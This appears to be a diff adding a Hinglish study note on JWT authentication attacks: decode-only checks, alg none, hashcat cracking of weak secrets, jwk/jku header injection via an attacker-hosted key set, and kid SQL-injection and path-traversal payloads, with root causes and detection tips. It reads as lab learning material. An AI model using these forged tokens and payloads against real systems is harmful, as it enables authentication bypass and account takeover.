@@ -1,0 +1,478 @@
+1. JWT Authentication Bypass via jwt.decode()
+Concept
+
+JWT ke saath do operations hoti hain:
+
+Decode
+jwt.decode(token)
+
+Sirf token ko read karta hai.
+
+Signature verify nahi karta.
+Koi bhi token accept kar lega.
+
+Example:
+
+{
+  "sub": "administrator"
+}
+
+Agar attacker payload modify kare:
+
+{
+  "sub": "administrator"
+}
+
+aur signature invalid ho tab bhi decode() data read kar lega.
+
+Verify
+jwt.verify(token, secret)
+
+Ye:
+
+Signature verify karta hai.
+Secret/Public Key check karta hai.
+Expiration check karta hai.
+
+Tabhi trusted data return karta hai.
+
+Vulnerable Code
+const user = jwt.decode(token);
+
+if(user.sub === "administrator")
+{
+    grantAccess();
+}
+
+Developer sirf decode kar raha hai.
+
+Signature verify nahi kar raha.
+
+Attack Flow
+Attacker
+    |
+    v
+JWT Payload Change
+sub = administrator
+    |
+    v
+Invalid Signature
+    |
+    v
+Server uses decode()
+    |
+    v
+Admin Access
+Impact
+Authentication Bypass
+Privilege Escalation
+Account Takeover
+Detection
+
+Look for:
+
+jwt.decode()
+
+instead of
+
+jwt.verify()
+2. JWT Accepting "alg":"none"
+Concept
+
+JWT header contains algorithm.
+
+Normal:
+
+{
+  "alg": "HS256"
+}
+
+Some vulnerable servers trust:
+
+{
+  "alg": "none"
+}
+
+Meaning:
+
+No Signature Required
+Attack
+
+Original:
+
+{
+  "sub": "wiener"
+}
+
+Change:
+
+{
+  "sub": "administrator"
+}
+
+Header:
+
+{
+  "alg": "none"
+}
+
+Remove signature.
+
+Result
+
+Server says:
+
+alg = none
+No need to verify signature
+
+Admin access granted.
+
+Lab Steps
+Intercept JWT.
+Change:
+{
+ "alg":"none"
+}
+Payload:
+{
+ "sub":"administrator"
+}
+Remove signature.
+Send.
+Visit:
+/admin
+Delete Carlos.
+
+Lab solved.
+
+Root Cause
+
+Server trusts user supplied algorithm.
+
+Should never trust:
+
+{
+ "alg":"none"
+}
+3. JWT Weak Secret Brute Force (Hashcat)
+Concept
+
+HS256 uses symmetric key.
+
+Server Secret
+=
+Signing Secret
+=
+Verification Secret
+
+Example:
+
+secret123
+
+If secret weak hai:
+
+password
+admin
+secret
+123456
+
+Bruteforce possible.
+
+Attack Flow
+Get JWT
+   |
+   v
+Extract Signature
+   |
+   v
+Hashcat
+   |
+   v
+Find Secret
+   |
+   v
+Create New JWT
+   |
+   v
+Admin Access
+Hashcat
+
+Mode:
+
+hashcat -m 16500 jwt.txt wordlist.txt
+
+Common wordlists:
+
+rockyou.txt
+jwt.secrets.list
+After Secret Found
+
+Example:
+
+secret = football
+
+Create new token:
+
+{
+  "sub":"administrator"
+}
+
+Sign with:
+
+football
+
+Server accepts.
+
+Root Cause
+
+Weak secret key.
+
+Bad:
+
+password
+secret
+admin123
+
+Good:
+
+128-bit random key
+256-bit random key
+4. JWK Header Injection
+Concept
+
+Normally server stores public keys.
+
+JWT header may contain:
+
+{
+  "jwk":{
+      ...
+  }
+}
+
+Some servers directly trust this key.
+
+Attack
+
+Generate own RSA key pair.
+
+Private Key:
+
+Used by attacker
+
+Public Key:
+
+Inserted into JWT
+
+Header:
+
+{
+  "alg":"RS256",
+  "jwk":{
+      "kty":"RSA",
+      ...
+  }
+}
+
+Payload:
+
+{
+  "sub":"administrator"
+}
+
+Sign using private key.
+
+Result
+
+Server:
+
+Reads attacker's public key
+Verifies attacker's signature
+Accepts token
+
+Admin access.
+
+Detection
+
+Look for:
+
+{
+  "jwk":{ ... }
+}
+
+inside JWT header.
+
+Root Cause
+
+Server trusts user supplied verification key.
+
+5. JKU Header Injection
+Concept
+
+JKU = JSON Web Key Set URL
+
+Header:
+
+{
+  "alg":"RS256",
+  "jku":"https://keys.company.com/jwks.json"
+}
+
+Server:
+
+Downloads public keys
+Uses them for verification
+Vulnerability
+
+Developer allows attacker-controlled URL.
+
+Attack
+
+Create own JWKS:
+
+{
+  "keys":[
+      {
+         "kty":"RSA",
+         "kid":"attack"
+      }
+  ]
+}
+
+Host it on exploit server.
+
+Example:
+
+https://exploit-server.net/jwks.json
+
+Header:
+
+{
+  "alg":"RS256",
+  "jku":"https://exploit-server.net/jwks.json",
+  "kid":"attack"
+}
+
+Payload:
+
+{
+  "sub":"administrator"
+}
+
+Sign using corresponding private key.
+
+Result
+
+Server:
+
+Downloads attacker's public key
+Verifies attacker's signature
+Accepts token
+
+Admin access.
+
+Attack Flow
+Attacker Private Key
+        |
+        v
+JWT Sign
+        |
+        v
+JKU -> Exploit Server
+        |
+        v
+Server Downloads Public Key
+        |
+        v
+Signature Valid
+        |
+        v
+Admin Access
+Root Cause
+
+No whitelist on JKU URLs.
+
+Should only allow:
+
+company-owned domains
+6. KID Injection Attack
+Concept
+
+KID = Key ID
+
+Example:
+
+{
+  "kid":"key1"
+}
+
+Server:
+
+readKey(kid)
+
+or
+
+SELECT key FROM keys WHERE kid='key1'
+Attack Type 1: SQL Injection
+{
+  "kid":"' OR 1=1--"
+}
+
+If backend vulnerable:
+
+SELECT key FROM keys
+WHERE kid='' OR 1=1--'
+
+Returns arbitrary key.
+
+Attack Type 2: Directory Traversal
+
+Header:
+
+{
+  "kid":"../../../../dev/null"
+}
+
+Server:
+
+readFile(kid)
+
+Reads:
+
+/dev/null
+Why /dev/null?
+
+Contents:
+
+(empty)
+
+Server uses:
+
+secret = ""
+
+Attacker signs JWT using:
+
+empty string
+
+Signature becomes valid.
+
+Attack Flow
+JWT
+ |
+ v
+kid=../../../../dev/null
+ |
+ v
+Server Reads Empty File
+ |
+ v
+Secret=""
+ |
+ v
+Attacker Signs With ""
+ |
+ v
+Valid Signature
+ |
+ v
+Admin Access
